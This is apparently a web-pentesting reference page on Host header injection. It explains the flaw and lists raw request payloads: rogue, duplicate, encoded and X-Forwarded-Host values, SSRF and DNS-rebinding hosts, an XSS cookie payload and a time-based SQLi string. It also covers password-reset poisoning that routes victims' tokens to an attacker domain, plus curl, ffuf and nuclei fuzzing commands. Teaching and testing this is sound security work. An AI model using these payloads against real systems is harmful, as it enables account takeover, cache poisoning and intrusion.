---
tags:
  - Web
---

# :material-server-network: Host Header Injection

<span class="pill pill-medium">header injection</span> <span class="pill pill-info">web</span>

**Host header injection** happens when an app trusts the `Host` header (or a proxy header like `X-Forwarded-Host`) to build absolute URLs, route virtual hosts, or make trust decisions — without validating it against an allowlist. Because the header is fully attacker-controlled, anything derived from it is attacker-controlled too.

*Technique set from "Mastering Host Header Injection: Techniques, Payloads and Real-World Scenarios" by [coffinxp](https://medium.com/@coffinxp).*

!!! abstract "TL;DR"
    Swap `Host:` for a domain you own and watch where it comes back — a password-reset link, a `Location:` redirect, a cached response, an absolute asset URL. If the server won't take a rogue `Host`, try `X-Forwarded-Host`, duplicate headers, a leading space, a port suffix, or an absolute URL.

## :material-magnify: Detection

Send the request twice — once clean, once with a rogue host — and diff. You are looking for your domain echoed into the body, into a `Location` header, into an email, or into a cached copy.

```bash
curl -I -H "Host: attacker.com" https://target.com
curl -I -H "X-Forwarded-Host: attacker.com" https://target.com
```

Signals worth chasing:

- Your domain appears in a link, script `src`, or `Location:` value.
- The app still returns `200` with a bogus host (weak or absent virtual-host validation).
- The response differs between `Host: target.com` and `Host: <something else>` in a way that suggests the header reached application logic.
- An out-of-band hit lands on your listener (password-reset flows especially).

## :material-tools: Core techniques

Every payload below is a raw request — send them in Repeater or with `curl`.

=== "Spoofing with malicious domain"

    Supply a domain you control so the app generates links and redirects pointing at your server.

    ```http
    GET /reset-password HTTP/1.1  
    Host: attacker.com
    ```

=== "Adding a prefix"

    Prepend your domain to the real one — some validators only check that the expected host is a *substring*.

    ```http
    GET /admin.php HTTP/1.1
    Host: attackertarget.com
    ```

=== "Absolute URL path"

    Some stacks parse the `Host` value as part of a full URL, which confuses backend routing or slips past filters.

    ```http
    GET /admin.php HTTP/1.1
    Host: https://target.com/admin.php
    ```

=== "Subdomain bypass"

    Validation that only looks for the presence of the main domain accepts any subdomain — including one you can take over.

    ```http
    GET /admin.php HTTP/1.1
    Host: subdomain.target.com
    ```

=== "Leading space or tab"

    A leading whitespace byte makes front-end and back-end disagree about whether the header exists at all.

    ```http
    GET /admin.php HTTP/1.1
     Host: target.com
    ```

=== "Different port"

    A port suffix can slide past host-based access controls that string-match the bare domain.

    ```http
    GET /admin.php HTTP/1.1
    Host: target.com:8080
    ```

=== "X-Forwarded-Host"

    The classic fallback: when the front-end pins `Host`, the app often still trusts the proxy header behind it.

    ```http
    GET /admin.php HTTP/1.1
    X-Forwarded-Host: attacker.com
    ```

=== "Server's IP address"

    Addressing the box directly can bypass virtual-host routing and land you on a default vhost or an internal app.

    ```http
    GET /admin.php HTTP/1.1
    Host: <target IP>
    ```

=== "Blank Host header"

    An empty value often falls through to the *first* configured virtual host — sometimes a staging or admin site.

    ```http
    GET /admin.php HTTP/1.1
    Host: 
    ```

=== "Multiple Host headers"

    Front-end reads the first, back-end reads the last (or vice versa) — the gap between the two is the bug.

    ```http
    GET /admin.php HTTP/1.1
    Host: target.com
    Host: attacker.com
    ```

=== "Another site on same IP"

    On shared infrastructure, naming a *different* valid domain can reach resources you were never routed to.

    ```http
    GET /admin.php HTTP/1.1
    Host: target2.com
    ```

## :material-flask: Advanced variants

=== "Reaching internal services (SSRF)"

    When SSRF filtering keys off the `Host` header, forge an internal name to reach internal APIs or metadata services.

    ```http
    Host: internal-service.local
    ```

=== "DNS rebinding"

    Point the host at a rebinding domain so the name validates first and resolves internal second — a way around same-origin and internal-network checks.

    ```http
    Host: rebinding.attacker.com
    ```

    Generate rebinding hostnames with [rbndr.us](https://lock.cmpxchg8b.com/rebinder.html).

=== "Special characters"

    Null bytes, CRLF, and Unicode inside the host value break naive validators and parsers.

    ```http
    GET /admin.php HTTP/1.1
    Host: target.com%00.attacker.com
    ```

=== "Path traversal"

    Misconfigured apps that concatenate the host into a filesystem or route path will happily walk it.

    ```http
    GET /admin.php HTTP/1.1
    Host: ../../attacker.com
    ```

=== "Encoded values"

    URL-encoding or double-encoding the host can survive a decode step that happens *after* validation.

    ```http
    GET /admin.php HTTP/1.1
    Host: %74%61%72%67%65%74.com
    ```

=== "Chaining X-Forwarded headers"

    Header values that land in HTML or in a SQL query turn the same surface into XSS and SQLi. `X-Forwarded-Host` and `X-Forwarded-For` are the usual suspects — they are frequently logged, rendered in admin panels, or used to build queries.

    ```text
    X-Forwarded-Host: evil.com"><img src/onerror=prompt(document.cookie)>

    X-Forwarded-Host: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
    ```

    The second one is a time-based oracle — a 10-second delay means the header reached the database. See [SQL Injection](sqli.md) and [XSS](xss.md).

## :material-fire: Impact

=== "Password reset poisoning"

    The highest-value outcome. The reset endpoint builds the token link from `Host`, the mail goes to the *victim*, and the link points at *you*. When the victim clicks, their token lands in your logs → [Account Takeover](account-takeover.md).

    ```http
    POST /reset-password HTTP/1.1
    Host: attacker.com
    ```

=== "Web cache poisoning"

    If the host-derived value is reflected but the header is not part of the cache key, one poisoned response is served to every subsequent visitor. See [Web Cache Poisoning](web-cache-poisoning.md).

=== "SSRF"

    Host-based allowlists that gate an outbound fetcher can be forged into pointing inward at internal services and metadata endpoints. See [SSRF](ssrf.md).

=== "Auth bypass / access control"

    Admin panels restricted "by host" (`Host: internal.target.com`, `Host: localhost`) fall to a forged header, as do vhost routes that were never meant to be publicly reachable.

=== "Open redirect"

    A `Location:` header built from `Host` is an open redirect with extra steps — useful for phishing and for OAuth token theft. See [Open Redirect](open-redirect.md).

!!! bug "Why your rogue Host isn't landing"
    - The front-end rejects unknown hosts before the app ever sees them — pivot to `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`, or duplicate `Host` headers.
    - The value is validated but not *re-validated* after decoding — try the `%00`, encoded, and absolute-URL forms.
    - It works but nothing is reflected — the bug may still be blind. Use a reset/invite/notification email flow as the out-of-band channel.

## :material-hammer-wrench: Tooling

=== "curl"

    Fastest way to confirm by hand.

    ```bash
    curl -I -H "Host: attacker.com" https://target.com
    curl -I -H "X-Forwarded-Host: attacker.com" https://target.com
    ```

=== "Burp Suite"

    Send the request to Repeater and step through the variants above one at a time, watching the Flow tab; Burp's scanner also flags host-header issues in the Dashboard. See [Burp](../toolbox/burp.md).

=== "Nuclei"

    ```bash
    nuclei -u https://target.com -t x-forwarded.yaml
    ```

    Template: [coffinxp/nuclei-templates — x-forwarded.yaml](https://github.com/coffinxp/nuclei-templates).

=== "ffuf"

    Fuzz the header itself against a vhost wordlist:

    ```bash
    ffuf -u https://target.com -H "Host: FUZZ" -w hosts.txt
    ```

=== "gau / waybackurls"

    Replay a collected URL list with a rogue host to find the one endpoint that reflects it:

    ```bash
    cat domains.txt | while read url; do curl -H "Host: attacker.com" "$url"; done
    ```

!!! tip "Automation"
    - [headerpwn](https://github.com/devanshbatham/headerpwn) — fuzzes headers and diffs how servers respond.
    - [xforwardy](https://github.com/roottusk/xforwardy) — dedicated host header injection scanner.
    - [hostinject](https://github.com/pikpikcu/hostinject) — Python host header injection tool.
    - [ModHeader](https://chromewebstore.google.com/detail/modheader-modify-http-hea/idgpnmonknjnojddfkpgkljpfnnfcklj) — browser extension for editing `Host` / `X-Forwarded-Host` by hand.

## :material-link-variant: Related

- Mass impact via [Web Cache Poisoning](web-cache-poisoning.md).
- Pivots inward through [SSRF](ssrf.md).
- Host-derived `Location` values become [Open Redirect](open-redirect.md).
- Reset-link poisoning ends in [Account Takeover](account-takeover.md).
- Repeater workflow in [Burp](../toolbox/burp.md).
- Reference: [PortSwigger — Host header attacks](https://portswigger.net/web-security/host-header).
